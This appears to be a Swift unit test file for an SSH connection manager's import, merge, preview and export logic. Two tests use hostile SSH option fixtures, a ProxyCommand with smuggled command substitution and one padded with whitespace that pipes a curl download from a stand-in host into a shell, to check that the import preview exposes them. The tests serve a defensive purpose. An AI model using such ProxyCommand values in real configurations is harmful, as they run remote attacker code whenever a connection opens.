import Foundation
import Testing
@testable import xpnd

private func conn(_ name: String, host: String = "h", act: String? = nil, jump: JumpHost? = nil, id: UUID = UUID()) -> Connection {
    Connection(id: id, name: name, host: host, activation: act, jumpHost: jump)
}

struct ConnectionImportTests {
    @Test func mergeByFolderName() {
        let existing = ConnectionLibrary(folders: [ConnectionFolder(
            name: "prod", connections: [conn("a")], folders: [ConnectionFolder(name: "db", connections: [conn("d1")])])])
        let incoming = ConnectionLibrary(folders: [
            ConnectionFolder(name: "prod", connections: [conn("b")],
                             folders: [ConnectionFolder(name: "db", connections: [conn("d2")])]),
            ConnectionFolder(name: "new", connections: [conn("n")])])
        let r = ConnectionImport.merge(incoming, into: existing, choice: .skip)
        #expect(r.folders.map(\.name) == ["prod", "new"])
        #expect(r.folders[0].connections.map(\.name) == ["a", "b"])
        #expect(r.folders[0].folders.count == 1)
        #expect(r.folders[0].folders[0].connections.map(\.name) == ["d1", "d2"])
    }

    @Test func skipReplaceOnActivationConflict() {
        let old = conn("old", act: ";x")
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [old])])
        let incoming = ConnectionLibrary(folders: [
            ConnectionFolder(name: "b", activation: ";f", connections: [conn("new", act: ";x")])])
        #expect(ConnectionImport.conflicts(incoming: incoming, existing: existing) == [";x"])

        let skipped = ConnectionImport.merge(incoming, into: existing, choice: .skip)
        #expect(skipped.allConnections.map(\.name) == ["old"])
        #expect(skipped.folders.map(\.name) == ["a", "b"])

        let replaced = ConnectionImport.merge(incoming, into: existing, choice: .replace)
        #expect(replaced.folders[0].connections.isEmpty)
        #expect(replaced.folders[1].connections.map(\.name) == ["new"])

        // A conflicting folder string is cleared to nil under skip.
        let existingF = ConnectionLibrary(folders: [ConnectionFolder(name: "z", activation: ";f")])
        let s = ConnectionImport.merge(incoming, into: existingF, choice: .skip)
        #expect(s.folders[1].activation == nil)
        let r = ConnectionImport.merge(incoming, into: existingF, choice: .replace)
        #expect(r.folders[1].activation == ";f")
        #expect(r.folders[0].activation == "")
    }

    @Test func idsKeptUnlessColliding() {
        let shared = conn("shared")
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [shared])])
        let keep = conn("keep")
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "b", connections: [
            conn("shared2", id: shared.id), conn("viaJump", jump: .connection(shared.id)), keep])])
        let r = ConnectionImport.merge(incoming, into: existing, choice: .skip)
        let b = r.folders[1].connections
        #expect(b[0].id != shared.id)
        #expect(b[1].jumpHost == .connection(b[0].id))
        #expect(b[2].id == keep.id)
        #expect(Set(r.allConnections.map(\.id)).count == 4)
    }

    @Test func hostsAddedListed() {
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [conn("x", host: "old")])])
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [
            conn("1", host: "zeta"), conn("2", host: "alpha"), conn("3", host: "alpha")])])
        #expect(ConnectionImport.hostsAdded(incoming: incoming, existing: existing, choice: .replace) == ["alpha", "zeta"])
        let clash = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [
            conn("x", host: "old", act: ";k")])])
        let inc2 = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [
            conn("1", host: "skipped", act: ";k"), conn("2", host: "kept")])])
        #expect(ConnectionImport.hostsAdded(incoming: inc2, existing: clash, choice: .skip) == ["kept"])
        #expect(ConnectionImport.hostsAdded(incoming: inc2, existing: clash, choice: .replace) == ["kept", "skipped"])
    }

    @Test func previewRowsShowWhatRunsOnConnect() {
        let bastion = conn("bastion", host: "b.example")
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [bastion, conn("x", act: ";k")])])
        var web = conn("web", host: "web.example", jump: .connection(bastion.id))
        web.username = "deploy"
        web.port = 2222
        web.sshOptions = "-o ProxyCommand=$(evil)"
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "b", connections: [
            web, conn("v6", host: "::1", jump: .text("ec2-user@jump:22")), conn("gone", jump: .connection(UUID())),
            conn("clash", act: ";k")])])
        let rows = ConnectionImport.preview(incoming: incoming, existing: existing, choice: .skip).added
        #expect(rows.map(\.name) == ["web", "v6", "gone"])
        #expect(rows[0].address == "deploy@web.example:2222")
        #expect(rows[0].jumpHost == "bastion")
        #expect(rows[0].sshOptions == "-o ProxyCommand=$(evil)")
        #expect(rows[1].address == "[::1]:22")
        #expect(rows[1].jumpHost == "ec2-user@jump:22")
        #expect(rows[2].jumpHost == "A missing connection")
        #expect(ConnectionImport.preview(incoming: incoming, existing: existing, choice: .replace).added.map(\.name)
            == ["web", "v6", "gone", "clash"])
    }

    /// Replace changes existing connections too, so the preview names them.
    @Test func previewShowsRemovedAndRepointedExisting() {
        let old = conn("old", act: ";x"), user = conn("user", jump: .connection(old.id)), plain = conn("plain", jump: .text("j"))
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [old, user, plain])])
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "b", connections: [conn("new", act: ";x")])])

        let replaced = ConnectionImport.preview(incoming: incoming, existing: existing, choice: .replace)
        #expect(replaced.added.map(\.name) == ["new"])
        #expect(replaced.removed == ["old"])
        #expect(replaced.rejumped == [ConnectionImport.Rejump(name: "user", jumpHost: "new")])

        let skipped = ConnectionImport.preview(incoming: incoming, existing: existing, choice: .skip)
        #expect(skipped.added.isEmpty)
        #expect(skipped.removed.isEmpty)
        #expect(skipped.rejumped.isEmpty)
    }

    @Test func previewShowsHiddenCharacters() {
        #expect(ConnectionImport.visible("-o A=1\n-o ProxyCommand=x") == "-o A=1⏎-o ProxyCommand=x")
        #expect(ConnectionImport.visible("a\tb\u{1B}[2Kc\r\u{7F}") == "a⇥b␛[2Kc␍␡")
        #expect(ConnectionImport.visible("x\u{202E}y\u{85}") == "x<U+202E>y<U+85>")
        let long = "-o ServerAliveInterval=30" + String(repeating: " ", count: 300) + "-o ProxyCommand=curl evil|sh"
        #expect(ConnectionImport.visible(long) == long)
        #expect(ConnectionImport.visible("prod 🚀 é") == "prod 🚀 é")
    }

    @Test func exportSelectedFoldersRoundTrips() throws {
        let inner = ConnectionFolder(name: "inner", connections: [conn("i", jump: .text("j"))])
        let a = ConnectionFolder(name: "a", activation: ";a", connections: [conn("c")], folders: [inner])
        let b = ConnectionFolder(name: "b", connections: [conn("d")])
        let lib = ConnectionLibrary(folders: [a, b])
        let one = try ConnectionYAML.decode(ConnectionImport.export(lib, folders: [a.id]))
        #expect(one.folders == [a])
        let nested = try ConnectionYAML.decode(ConnectionImport.export(lib, folders: [inner.id]))
        #expect(nested.folders == [inner])
        #expect(try ConnectionYAML.decode(ConnectionImport.export(lib, folders: nil)) == lib)
    }

    @Test func jumpsRepointedAfterRemoval() {
        // Replace: existing connection evicted; an existing jump to it follows the replacement.
        let old = conn("old", act: ";x")
        let user = conn("user", jump: .connection(old.id))
        let existing = ConnectionLibrary(folders: [ConnectionFolder(name: "a", connections: [old, user])])
        let new = conn("new", act: ";x")
        let r = ConnectionImport.merge(ConnectionLibrary(folders: [ConnectionFolder(name: "b", connections: [new])]),
                                       into: existing, choice: .replace)
        #expect(r.connection(user.id)?.jumpHost == .connection(new.id))

        // Skip: dropped incoming connection; incoming jumps to it follow the kept existing one.
        let dropped = conn("dropped", act: ";x")
        let via = conn("via", jump: .connection(dropped.id))
        let s = ConnectionImport.merge(
            ConnectionLibrary(folders: [ConnectionFolder(name: "b", connections: [dropped, via])]),
            into: existing, choice: .skip)
        #expect(s.connection(via.id)?.jumpHost == .connection(old.id))
    }

    @Test func mergedFolderActivation() {
        let victim = conn("v", act: ";f")
        func lib(_ folderAct: String?) -> ConnectionLibrary {
            ConnectionLibrary(folders: [ConnectionFolder(name: "a", activation: folderAct), ConnectionFolder(name: "o", connections: [victim])])
        }
        let incoming = ConnectionLibrary(folders: [ConnectionFolder(name: "a", activation: ";f")])
        // No conflict with the folder itself having none: adopted.
        let free = ConnectionImport.merge(incoming, into: ConnectionLibrary(folders: [ConnectionFolder(name: "a")]), choice: .skip)
        #expect(free.folders[0].activation == ";f")
        // Conflict with another owner.
        let skipped = ConnectionImport.merge(incoming, into: lib(nil), choice: .skip)
        #expect(skipped.folders[0].activation == nil)
        #expect(skipped.folders[1].connections.count == 1)
        let replaced = ConnectionImport.merge(incoming, into: lib(nil), choice: .replace)
        #expect(replaced.folders[0].activation == ";f")
        #expect(replaced.folders[1].connections.isEmpty)
    }
}
